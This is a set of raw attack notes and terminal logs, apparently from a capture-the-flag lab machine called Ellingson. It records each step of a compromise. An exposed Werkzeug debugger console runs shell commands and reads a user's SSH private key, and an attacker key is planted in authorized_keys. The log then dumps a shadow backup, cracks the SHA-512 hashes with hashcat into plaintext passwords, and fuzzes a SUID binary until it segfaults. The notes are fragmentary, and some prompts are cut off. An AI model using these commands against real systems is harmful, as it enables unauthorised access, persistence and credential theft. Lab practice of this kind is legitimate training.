@@ -1,0 +1,399 @@
+IndexError: list index out of range // Werkzeug Debugger
+
+ The debugger caught an exception in your WSGI application. You can now look at the traceback which led to the error.
+
+To switch between the interactive traceback and the plaintext one, you can click on the "Traceback" headline. From the text traceback you can also create a paste of it. For code execution mouse-over the frame you want to debug and click on the console icon on the right side.
+
+You can execute arbitrary Python code in the stack frames and there are some extra helpers available for introspection:
+
+    dump() shows all variables in the frame
+    dump(obj) dumps all that's known about the object
+
+Brought to you by DON'T PANIC, your friendly Werkzeug powered traceback interpreter. 
+
+
+
+Python console accessible at http://ellingson.htb/articles/5
+
+
+[console ready]
+>>> import subprocess
+>>> a = subprocess.check_output('ls -a /home', shell=True)
+>>> print(a)
+b'.\n..\nduke\nhal\nmargo\ntheplague\n'
+>>> b = subprocess.check_output('ls -a /home/duke', shell=True)
+
+b = subprocess.check_output('ls -a /home/hal', shell=True)
+>>> print(b)
+b'.\n..\nabc.txt\na.sh\n.bash_logout\n.bashrc\n.cache\ngarbage\n.gnupg\n.local\n.profile\n.ssh\n.viminfo\n'
+>>> c = subprocess.check_output('ls -a /home/hal/.ssh', shell=True)
+>>> print(c)
+b'.\n..\nauthorized_keys\nid_rsa\nid_rsa.pub\nknown_hosts\n'
+>>> d = subprocess.check_output('ls -a /home/hal/.ssh/id_rsa', shell=True)
+>>> print(d)
+b'/home/hal/.ssh/id_rsa\n'
+>>> e = subprocess.check_output('cat /home/hal/.ssh/id_rsa', shell=True)
+>>> print(e)
+
+
+
+ADD KEYS
+
+
+>>> import subprocess
+>>> a = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDZrdraRdQKkaHKVJIlLimlIAUeObHi77UXhGdmNE0N9TiWs3gglX7DZQQw247+WtGxbUmMi+Kwa0yEp7cQIc6rDYew0Mj42CUhwjEpu55gC8Hw4m8ufYHD01Tn3w75PZK2flz18xProOshDabCI1Ys+Ledq74S6eYy/sqA4SyTQXdxj4etQanqgOvdG3ElM0dLvr/Pxt3T2NDaPANv5fWuNYUFmF60bK1iaUTNC9RBqadjxiIwEA6lLcWO/Mprw9sy/G5JGKwpug1+g3mTWpJtyRdwIBD4KqcyXLnj3ttuBWOkHmjPyj03IIVvWCRfYn1Ke9uoH3cxbE6mjZLwvKcx root@kali"
+>>> b = subprocess.check_output(f"echo {a} > /home/hal/.ssh/authorized_keys", shell=True)
+>>> c = subprocess.check_output("cat /home/hal/.ssh/authorized_keys", shell=True)
+>>> d = subprocess.check_output("cat /home/hal/.ssh/authorized_keys", shell=True)
+>>> print(d)
+
+
+root@kali:~/HTB/Ellingson# ssh -i id_rsa hal@ellingson.htb
+Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-46-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Thu May 30 07:32:16 UTC 2019
+
+  System load:  0.03               Processes:            118
+  Usage of /:   23.7% of 19.56GB   Users logged in:      2
+  Memory usage: 28%                IP address for ens33: 10.10.10.139
+  Swap usage:   0%
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+163 packages can be updated.
+80 updates are security updates.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Thu May 30 07:28:04 2019 from 10.10.14.46
+hal@ellingson:~$ 
+
+hal@ellingson:~$ uname -a
+Linux ellingson 4.15.0-46-generic #49-Ubuntu SMP Wed Feb 6 09:33:07 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+hal@ellingson:~$ env
+SSH_CONNECTION=10.10.15.92 44580 10.10.10.139 22
+LESSCLOSE=/usr/bin/lesspipe %s %s
+LANG=en_US.UTF-8
+XDG_SESSION_ID=35
+USER=hal
+PWD=/home/hal
+HOME=/home/hal
+SSH_CLIENT=10.10.15.92 44580 22
+XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
+SSH_TTY=/dev/pts/8
+MAIL=/var/mail/hal
+TERM=xterm-256color
+SHELL=/bin/bash
+SHLVL=1
+LOGNAME=hal
+XDG_RUNTIME_DIR=/run/user/1001
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+LESSOPEN=| /usr/bin/lesspipe %s
+_=/usr/bin/env
+
+
+
+hal@ellingson:/var/backups$ cat shadow.bak
+root:*:17737:0:99999:7:::
+daemon:*:17737:0:99999:7:::
+bin:*:17737:0:99999:7:::
+sys:*:17737:0:99999:7:::
+sync:*:17737:0:99999:7:::
+games:*:17737:0:99999:7:::
+man:*:17737:0:99999:7:::
+lp:*:17737:0:99999:7:::
+mail:*:17737:0:99999:7:::
+news:*:17737:0:99999:7:::
+uucp:*:17737:0:99999:7:::
+proxy:*:17737:0:99999:7:::
+www-data:*:17737:0:99999:7:::
+backup:*:17737:0:99999:7:::
+list:*:17737:0:99999:7:::
+irc:*:17737:0:99999:7:::
+gnats:*:17737:0:99999:7:::
+nobody:*:17737:0:99999:7:::
+systemd-network:*:17737:0:99999:7:::
+systemd-resolve:*:17737:0:99999:7:::
+syslog:*:17737:0:99999:7:::
+messagebus:*:17737:0:99999:7:::
+_apt:*:17737:0:99999:7:::
+lxd:*:17737:0:99999:7:::
+uuidd:*:17737:0:99999:7:::
+dnsmasq:*:17737:0:99999:7:::
+landscape:*:17737:0:99999:7:::
+pollinate:*:17737:0:99999:7:::
+sshd:*:17737:0:99999:7:::
+theplague:$6$.5ef7Dajxto8Lz3u$Si5BDZZ81UxRCWEJbbQH9mBCdnuptj/aG6mqeu9UfeeSY7Ot9gp2wbQLTAJaahnlTrxN613L6Vner4tO1W.ot/:17964:0:99999:7:::
+hal:$6$UYTy.cHj$qGyl.fQ1PlXPllI4rbx6KM.lW6b3CJ.k32JxviVqCC2AJPpmybhsA8zPRf0/i92BTpOKtrWcqsFAcdSxEkee30:17964:0:99999:7:::
+margo:$6$Lv8rcvK8$la/ms1mYal7QDxbXUYiD7LAADl.yE4H7mUGF6eTlYaZ2DVPi9z1bDIzqGZFwWrPkRrB9G/kbd72poeAnyJL4c1:17964:0:99999:7:::
+duke:$6$bFjry0BT$OtPFpMfL/KuUZOafZalqHINNX/acVeIDiXXCPo9dPi1YHOp9AAAAnFTfEh.2AheGIvXMGMnEFl5DlTAbIzwYc/:17964:0:99999:7:::
+hal@ellingson:/var/backups$ 
+
+hal@ellingson:/var/www/html$ find / -perm -u=s -type f 2>/dev/null
+/usr/bin/at
+/usr/bin/newgrp
+/usr/bin/pkexec
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/garbage
+/usr/bin/newuidmap
+/usr/bin/sudo
+/usr/bin/traceroute6.iputils
+/usr/bin/chfn
+/usr/bin/newgidmap
+/usr/bin/chsh
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/snapd/snap-confine
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/bin/su
+/bin/umount
+/bin/ntfs-3g
+/bin/ping
+/bin/mount
+/bin/fusermount
+/snap/core/6405/bin/mount
+/snap/core/6405/bin/ping
+/snap/core/6405/bin/ping6
+/snap/core/6405/bin/su
+/snap/core/6405/bin/umount
+/snap/core/6405/usr/bin/chfn
+/snap/core/6405/usr/bin/chsh
+/snap/core/6405/usr/bin/gpasswd
+/snap/core/6405/usr/bin/newgrp
+/snap/core/6405/usr/bin/passwd
+/snap/core/6405/usr/bin/sudo
+/snap/core/6405/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/6405/usr/lib/openssh/ssh-keysign
+/snap/core/6405/usr/lib/snapd/snap-confine
+/snap/core/6405/usr/sbin/pppd
+/snap/core/4917/bin/mount
+/snap/core/4917/bin/ping
+/snap/core/4917/bin/ping6
+/snap/core/4917/bin/su
+/snap/core/4917/bin/umount
+/snap/core/4917/usr/bin/chfn
+/snap/core/4917/usr/bin/chsh
+/snap/core/4917/usr/bin/gpasswd
+/snap/core/4917/usr/bin/newgrp
+/snap/core/4917/usr/bin/passwd
+/snap/core/4917/usr/bin/sudo
+/snap/core/4917/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/4917/usr/lib/openssh/ssh-keysign
+/snap/core/4917/usr/lib/snapd/snap-confine
+/snap/core/4917/usr/sbin/pppd
+/snap/core/6818/bin/mount
+/snap/core/6818/bin/ping
+/snap/core/6818/bin/ping6
+/snap/core/6818/bin/su
+/snap/core/6818/bin/umount
+/snap/core/6818/usr/bin/chfn
+/snap/core/6818/usr/bin/chsh
+/snap/core/6818/usr/bin/gpasswd
+/snap/core/6818/usr/bin/newgrp
+/snap/core/6818/usr/bin/passwd
+/snap/core/6818/usr/bin/sudo
+/snap/core/6818/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/6818/usr/lib/openssh/ssh-keysign
+/snap/core/6818/usr/lib/snapd/snap-confine
+/snap/core/6818/usr/sbin/pppd
+
+
+hal@ellingson:~$ groups
+hal adm
+hal@ellingson:~$ groups hal
+hal : hal adm
+hal@ellingson:~$ cat /etc/group
+root:x:0:
+daemon:x:1:
+bin:x:2:
+sys:x:3:
+adm:x:4:syslog,theplague,hal
+tty:x:5:
+disk:x:6:
+lp:x:7:
+mail:x:8:
+news:x:9:
+uucp:x:10:
+man:x:12:
+proxy:x:13:
+kmem:x:15:
+dialout:x:20:
+fax:x:21:
+voice:x:22:
+cdrom:x:24:theplague
+floppy:x:25:
+tape:x:26:
+sudo:x:27:theplague
+audio:x:29:
+dip:x:30:theplague
+www-data:x:33:
+backup:x:34:
+operator:x:37:
+list:x:38:
+irc:x:39:
+src:x:40:
+gnats:x:41:
+shadow:x:42:
+utmp:x:43:
+video:x:44:
+sasl:x:45:
+plugdev:x:46:theplague
+staff:x:50:
+games:x:60:
+users:x:100:
+nogroup:x:65534:
+systemd-journal:x:101:
+systemd-network:x:102:
+systemd-resolve:x:103:
+input:x:104:
+crontab:x:105:
+syslog:x:106:
+messagebus:x:107:
+lxd:x:108:theplague
+mlocate:x:109:
+uuidd:x:110:
+ssh:x:111:
+landscape:x:112:
+theplague:x:1000:
+hal:x:1001:
+margo:x:1002:
+duke:x:1003:
+ssl-cert:x:113:
+postfix:x:114:
+postdrop:x:115:
+netdev:x:116:
+
+
+
+CRACK SHADOW HASHES
+
+
+root@kali:~/HTB/Ellingson# cp shadow.txt shadow
+root@kali:~/HTB/Ellingson# cp passwd.txt passwd
+root@kali:~/HTB/Ellingson# unshadow
+Usage: unshadow PASSWORD-FILE SHADOW-FILE
+root@kali:~/HTB/Ellingson# unshadow passwd shadow > unshadowed.txt
+
+root@kali:~/HTB/Ellingson# hashcat -m 1800 unshadowed.txt /usr/share/wordlists/rockyou.txt --force
+hashcat (v5.1.0) starting...
+
+OpenCL Platform #1: The pocl project
+====================================
+* Device #1: pthread-Intel(R) Core(TM) i5-3340M CPU @ 2.70GHz, 512/1097 MB allocatable, 2MCU
+
+Hashfile 'unshadowed.txt' on line 1 (root:*:0:0:root:/root:/bin/bash): Token length exception
+Hashfile 'unshadowed.txt' on line 2 (daemon...emon:/usr/sbin:/usr/sbin/nologin): Token length exception
+Hashfile 'unshadowed.txt' on line 3 (bin:*:2:2:bin:/bin:/usr/sbin/nologin): Token length exception
+Hashfile 'unshadowed.txt' on line 4 (sys:*:3:3:sys:/dev:/usr/sbin/nologin): Token length exception
+Hashfile 'unshadowed.txt' on line 5 (sync:*:4:65534:sync:/bin:/bin/sync): Token length exception
+Hashfile 'unshadowed.txt' on line 6 (games:...mes:/usr/games:/usr/sbin/nologin): Token length exception
+Hashfile 'unshadowed.txt' on line 7 (man:*:.../var/cache/man:/usr/sbin/nologin): Token length exception
+Hashfile 'unshadowed.txt' on line 8 (lp:*:7.../var/spool/lpd:/usr/sbin/nologin): Token length exception
+Hashfile 'unshadowed.txt' on line 9 (mail:*...mail:/var/mail:/usr/sbin/nologin): Token length exception
+Hashfile 'unshadowed.txt' on line 10 (news:*...var/spool/news:/usr/sbin/nologin): Token length exception
+Hashfile 'unshadowed.txt' on line 11 (uucp:*...var/spool/uucp:/usr/sbin/nologin): Token length exception
+Hashfile 'unshadowed.txt' on line 12 (proxy:...:13:proxy:/bin:/usr/sbin/nologin): Token length exception
+Hashfile 'unshadowed.txt' on line 13 (www-da...-data:/var/www:/usr/sbin/nologin): Token length exception
+Hashfile 'unshadowed.txt' on line 14 (backup...p:/var/backups:/usr/sbin/nologin): Token length exception
+Hashfile 'unshadowed.txt' on line 15 (list:*...ager:/var/list:/usr/sbin/nologin): Token length exception
+Hashfile 'unshadowed.txt' on line 16 (irc:*:...:/var/run/ircd:/usr/sbin/nologin): Token length exception
+Hashfile 'unshadowed.txt' on line 17 (gnats:.../var/lib/gnats:/usr/sbin/nologin): Token length exception
+Hashfile 'unshadowed.txt' on line 18 (nobody...y:/nonexistent:/usr/sbin/nologin): Token length exception
+Hashfile 'unshadowed.txt' on line 19 (system.../systemd/netif:/usr/sbin/nologin): Token length exception
+Hashfile 'unshadowed.txt' on line 20 (system...ystemd/resolve:/usr/sbin/nologin): Token length exception
+Hashfile 'unshadowed.txt' on line 21 (syslog...::/home/syslog:/usr/sbin/nologin): Token length exception
+Hashfile 'unshadowed.txt' on line 22 (messag...::/nonexistent:/usr/sbin/nologin): Token length exception
+Hashfile 'unshadowed.txt' on line 23 (_apt:*...::/nonexistent:/usr/sbin/nologin): Token length exception
+Hashfile 'unshadowed.txt' on line 24 (lxd:*:...:65534::/var/lib/lxd/:/bin/false): Token length exception
+Hashfile 'unshadowed.txt' on line 25 (uuidd:...10::/run/uuidd:/usr/sbin/nologin): Token length exception
+Hashfile 'unshadowed.txt' on line 26 (dnsmas...:/var/lib/misc:/usr/sbin/nologin): Token length exception
+Hashfile 'unshadowed.txt' on line 27 (landsc.../lib/landscape:/usr/sbin/nologin): Token length exception
+Hashfile 'unshadowed.txt' on line 28 (pollin...:/var/cache/pollinate:/bin/false): Token length exception
+Hashfile 'unshadowed.txt' on line 29 (sshd:*...534::/run/sshd:/usr/sbin/nologin): Token length exception
+Hashfile 'unshadowed.txt' on line 34 (postfi.../spool/postfix:/usr/sbin/nologin): Token length exception
+Hashes: 4 digests; 4 unique digests, 4 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Applicable optimizers:
+* Zero-Byte
+* Uses-64-Bit
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+ATTENTION! Pure (unoptimized) OpenCL kernels selected.
+This enables cracking passwords and salts > length 32 but for the price of drastically reduced performance.
+If you want to switch to optimized OpenCL kernels, append -O to your commandline.
+
+Watchdog: Hardware monitoring interface not found on your system.
+Watchdog: Temperature abort trigger disabled.
+
+* Device #1: build_opts '-cl-std=CL1.2 -I OpenCL -I /usr/share/hashcat/OpenCL -D LOCAL_MEM_TYPE=2 -D VENDOR_ID=64 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=4 -D DEVICE_TYPE=2 -D DGST_R0=0 -D DGST_R1=1 -D DGST_R2=2 -D DGST_R3=3 -D DGST_ELEM=16 -D KERN_TYPE=1800 -D _unroll'
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+$6$.5ef7Dajxto8Lz3u$Si5BDZZ81UxRCWEJbbQH9mBCdnuptj/aG6mqeu9UfeeSY7Ot9gp2wbQLTAJaahnlTrxN613L6Vner4tO1W.ot/:password123
+[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit => 
+
+margo:iamgod$08
+
+
+
+al@ellingson:~$ su margo
+Password: 
+margo@ellingson:/home/hal$ ls -a
+ls: cannot open directory '.': Permission denied
+margo@ellingson:/home/hal$ cd /home
+margo@ellingson:/home$ ls -a
+.  ..  duke  hal  margo  theplague
+margo@ellingson:/home$ cd margo
+margo@ellingson:~$ ls -a
+.  ..  .bash_logout  .bashrc  .cache  .gnupg  .local  .profile  .ssh  user.txt  .viminfo
+margo@ellingson:~$ cat user.txt
+d0ff9e3f9da8bb00aaa6c0bb73e45903
+margo@ellingson:~$ 
+
+
+
+argo@ellingson:/bin$ locate garbage
+/usr/bin/garbage
+margo@ellingson:/bin$ /usr/bin/garbage
+Enter access password: iamgod$08
+
+access denied.
+margo@ellingson:/bin$ /usr/bin/garbage
+Enter access password: password123
+
+access denied.
+
+
+
+
+
+
+margo@ellingson:~$ /usr/bin/garbage
+Enter access password: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwhoami
+
+access denied.
+Segmentation fault (core dumped)
+
+
+oot@kali:~/HTB/Ellingson# scp margo@ellingson.htb:/usr/bin/garbage .
+margo@ellingson.htb's password: 
+garbage                                              100%   18KB   6.8KB/s   00:02    
+
